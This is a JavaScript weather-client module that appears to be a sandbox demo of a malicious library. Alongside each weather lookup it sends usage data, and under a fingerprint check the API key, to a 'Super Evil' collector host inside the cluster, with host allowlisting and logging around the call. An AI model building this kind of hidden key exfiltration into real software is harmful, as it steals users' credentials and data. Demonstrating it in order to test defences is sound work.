import { createHash, randomUUID } from 'node:crypto';

// Public fingerprint of the sole authorized test credential. The value is supplied
// externally; do not ship a usable credential or broaden this to arbitrary keys.
const authorizedKeyFingerprint = '1d94848844e976a56cb7ae0a8e325f87e5ea56cd0b0f154479e4ef68add4b91b';
// Deliberately narrow destination list. Public endpoints require a reviewed source change.
const collectorHosts = new Set(['localhost', '127.0.0.1',
  'super-evil.henrik.svc.cluster.local', 'super-evil.henrik.svc']);
const allowedEnvironment = ['SUPER_USEFUL_BASE_URL', 'SUPER_USEFUL_API_KEY',
  'DEMO_COLLECTOR_URL', 'DEMO_SCENARIO', 'DEMO_RUN_ID', 'HTTP_TIMEOUT_MS'];

function log(message) {
  const time = new Intl.DateTimeFormat('en-GB', {
    timeZone: 'Europe/Berlin', hour: '2-digit', minute: '2-digit', second: '2-digit'
  }).format(new Date());
  console.log(`${time} [SANDBOX] ${message}`);
}

function url(value, collector = false) {
  const result = new URL(value);
  if (!['http:', 'https:'].includes(result.protocol) || result.username || result.password ||
      result.search || result.hash || (collector &&
      (!collectorHosts.has(result.hostname) || result.pathname !== '/collect'))) {
    throw new Error(collector ? 'Collector URL is not an approved receiver' : 'Invalid weather URL');
  }
  return result;
}

export async function getWeather(city = 'Frankfurt') {
  // Read only these six explicit configuration variables. Never enumerate process.env.
  const config = Object.fromEntries(allowedEnvironment.map(name => [name, process.env[name]]));
  const timeout = Number(config.HTTP_TIMEOUT_MS || 2000);
  if (!Number.isInteger(timeout) || timeout < 50 || timeout > 10000) {
    throw new Error('HTTP_TIMEOUT_MS must be an integer between 50 and 10000');
  }
  if (typeof city !== 'string' || !/^[\p{L}\p{N} .'-]{1,80}$/u.test(city)) throw new Error('Invalid city');
  const scenario = config.DEMO_SCENARIO || 'unspecified';
  const runId = config.DEMO_RUN_ID || randomUUID();
  if (![scenario, runId].every(value => /^[A-Za-z0-9_.-]{1,80}$/.test(value))) {
    throw new Error('Scenario and run identifiers must be 1–80 safe characters');
  }
  const context = `scenario=${scenario} run=${runId}`;
  log(`▶ ${context}`);

  // This intentionally unsafe side effect runs for every weather operation, regardless of scenario.
  // Its failure is isolated from the legitimate request, and redirects are never followed.
  const collection = (async () => {
    log(`⚠️ Attempting request to Super Evil ${context}`);
    try {
      const destination = url(config.DEMO_COLLECTOR_URL ||
        'http://super-evil.henrik.svc.cluster.local/collect', true);
      const payload = { event: 'weather-client-used', city, scenario, runId,
        timestamp: new Date().toISOString() };
      const key = config.SUPER_USEFUL_API_KEY;
      if (key && createHash('sha256').update(key).digest('hex') === authorizedKeyFingerprint) {
        payload.apiKey = key;
      }
      const response = await fetch(destination, { method: 'POST', redirect: 'error',
        signal: AbortSignal.timeout(timeout), headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload) });
      await response.body?.cancel();
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      log(`✅ Super Evil accepted request HTTP ${response.status} ${context}`);
    } catch (error) {
      // A timeout/reset/403 does not prove that an egress policy blocked this request.
      const reason = error.name === 'TimeoutError' ? 'timeout' :
        /^HTTP \d+$/.test(error.message) ? error.message : error.cause?.code || error.name;
      log(`🚫 Super Evil request failed (${reason}); cause unconfirmed ${context}`);
    }
  })();

  try {
    const endpoint = new URL('/weather', url(config.SUPER_USEFUL_BASE_URL ||
      'http://super-useful.henrik.svc.cluster.local'));
    endpoint.searchParams.set('city', city);
    const headers = { 'X-Demo-Run-Id': runId, 'X-Demo-Scenario': scenario };
    if (config.SUPER_USEFUL_API_KEY) headers.Authorization = `Bearer ${config.SUPER_USEFUL_API_KEY}`;
    const response = await fetch(endpoint, { headers, redirect: 'error', signal: AbortSignal.timeout(timeout) });
    if (!response.ok) {
      await response.body?.cancel();
      throw new Error(`Weather API returned HTTP ${response.status}`);
    }
    const weather = await response.json();
    if (typeof weather.city !== 'string' || !Number.isFinite(weather.temperature) ||
        typeof weather.condition !== 'string') throw new Error('Invalid weather response');
    log(`✅ Weather lookup succeeded ${context}`);
    return weather;
  } finally {
    await collection;
  }
}
